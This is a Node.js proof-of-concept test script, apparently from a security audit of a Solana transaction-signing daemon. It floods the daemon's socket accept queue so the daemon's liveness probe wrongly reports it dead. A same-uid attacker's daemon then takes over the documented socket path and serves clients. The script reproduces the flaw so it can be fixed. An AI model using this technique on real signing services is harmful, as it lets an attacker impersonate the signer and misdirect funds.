'use strict';
// P4b: R2-1 false negative — "a failed start()/never-started stop() no longer
// unlinks a LIVE daemon's socket".
//
// The liveness probe in src/daemon.js is `net.connect` + 500 ms timeout:
//   connect event  -> alive -> refuse (socket_in_use)
//   error event    -> NOT alive -> unlink the path and bind our own
//   timeout        -> NOT alive -> unlink the path and bind our own
// A live daemon whose ACCEPT QUEUE is full answers new SYNs with RST
// (ECONNREFUSED) or drops them -> the probe says "dead" -> the path of a
// LIVE daemon is unlinked and a SECOND daemon binds the documented client
// path. The original daemon keeps running and keeps its (now unlinked)
// socket inode.
//
// Threat model note: the socket is 0600, so the attacker must be the same
// uid as the daemon owner (or root). The impact is impersonation of the
// signing daemon to every other client of that account, plus a live daemon
// whose path a second instance owns.
const fs = require('node:fs');
const net = require('node:net');
const path = require('node:path');
const { spawn } = require('node:child_process');
const { Keypair } = require('@solana/web3.js');
const { Daemon, request } = require('../../src/daemon');
const { tmpdir, grantDoc, writeGrants, makeWire } = require('./common');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function readLine(child, ms = 8000) {
  return new Promise((resolve, reject) => {
    let buf = '';
    const timer = setTimeout(() => reject(new Error('no output')), ms);
    child.stdout.on('data', (d) => {
      buf += d.toString();
      const nl = buf.indexOf('\n');
      if (nl >= 0) { clearTimeout(timer); resolve(buf.slice(0, nl)); }
    });
    child.on('exit', (c) => { clearTimeout(timer); reject(new Error(`exited ${c}`)); });
  });
}

(async () => {
  const dir = tmpdir('signerd-r5-p4b-');
  fs.chmodSync(dir, 0o755);
  const out = {};

  // The real daemon (A) runs as a child process with its own keystore.
  const { createKeystore } = require('../../src/keystore');
  const keystore = path.join(dir, 'a.key');
  createKeystore({ file: keystore, passphrase: 'p4b-pass' });
  const { loadKeystore } = require('../../src/keystore');
  const keyA = loadKeystore({ file: keystore, passphrase: 'p4b-pass' });
  const recipient = Keypair.generate().publicKey;
  const grantsFile = path.join(dir, 'grants.json');
  writeGrants(grantsFile, grantDoc(keyA.publicKey.toBase58(), recipient.toBase58()));
  const passFile = path.join(dir, 'pass.txt');
  fs.writeFileSync(passFile, 'p4b-pass\n');
  fs.chmodSync(passFile, 0o600);
  const socketPath = path.join(dir, 'a.sock');
  const ledgerA = path.join(dir, 'a-journal.jsonl');

  const child = spawn(process.execPath, [
    path.join(__dirname, '..', '..', 'bin', 'signerd.js'), 'run',
    '--keystore', keystore, '--passphrase-file', passFile,
    '--grants', grantsFile, '--ledger', ledgerA, '--socket', socketPath,
  ], { stdio: ['ignore', 'pipe', 'pipe'] });
  child.stderr.on('data', () => {});
  out.A_started = JSON.parse(await readLine(child));
  out.socket_inode_A = fs.statSync(socketPath).ino;

  // The attacker's daemon (B): same uid, DIFFERENT key, its own grant file
  // (the attacker owns it) naming ITS OWN key and the same destination.
  const keyB = Keypair.generate();
  const grantsB = path.join(dir, 'grants-b.json');
  writeGrants(grantsB, grantDoc(keyB.publicKey.toBase58(), recipient.toBase58()));
  const ledgerB = path.join(dir, 'b-journal.jsonl');

  // Saturate A's accept queue: hold many connections open (same uid, allowed
  // by the socket's 0600 mode).
  const held = [];
  const codes = {};
  await new Promise((resolve) => {
    let launched = 0;
    const launch = () => {
      while (launched < 2000) {
        launched += 1;
        const s = net.connect(socketPath);
        held.push(s);
        s.on('connect', () => { codes.connect = (codes.connect || 0) + 1; });
        s.on('error', (e) => { codes[e.code] = (codes[e.code] || 0) + 1; });
      }
    };
    launch();
    setTimeout(resolve, 4000);
  });
  out.queue_saturation = { launched: held.length, codes };

  // Reproduce the daemon's own probe verbatim: what does it see?
  out.daemon_probe_verbatim = await new Promise((resolve) => {
    const probe = net.connect(socketPath);
    let verdict = 'timeout(=> considered DEAD)';
    probe.once('connect', () => { verdict = 'connect(=> alive)'; probe.destroy(); resolve(verdict); });
    probe.once('error', (e) => { verdict = `error ${e.code}(=> considered DEAD)`; probe.destroy(); resolve(verdict); });
    probe.setTimeout(500, () => { probe.destroy(); resolve(verdict); });
  });

  // Now start the attacker's daemon on the SAME socket path.
  const B = new Daemon({ socketPath, keypair: keyB, grantFile: grantsB, ledgerFile: ledgerB });
  try {
    await B.start();
    out.B_started = 'YES';
  } catch (err) {
    out.B_started = `refused: ${err.code || err.message}`;
  }
  out.socket_inode_after_B = fs.existsSync(socketPath) ? fs.statSync(socketPath).ino : null;
  out.A_socket_path_replaced = out.socket_inode_after_B !== out.socket_inode_A;

  // A is still alive (its process is running, its server is still bound to the
  // now-unlinked inode).
  out.A_process_alive = (() => { try { process.kill(child.pid, 0); return true; } catch { return false; } })();
  // And the DOCUMENTED client path now serves the attacker's daemon.
  const clientWire = makeWire(keyB, recipient, 123);
  out.client_request_to_documented_path =
    await request({ socketPath, grant: 'ops', wire: clientWire });

  // A's own socket still works, but only via its inode (not via the path).
  out.note = 'A still holds the unlinked inode; the PATH now belongs to B.';

  for (const s of held) { try { s.destroy(); } catch { /* closed */ } }
  await B.stop();
  child.kill('SIGKILL');
  await sleep(300);
  out.final_socket_exists = fs.existsSync(socketPath);
  console.log(JSON.stringify(out, null, 2));
  fs.rmSync(dir, { recursive: true, force: true });
  process.exit(0);
})().catch((err) => { console.error('PROBE ERROR', err); process.exit(1); });
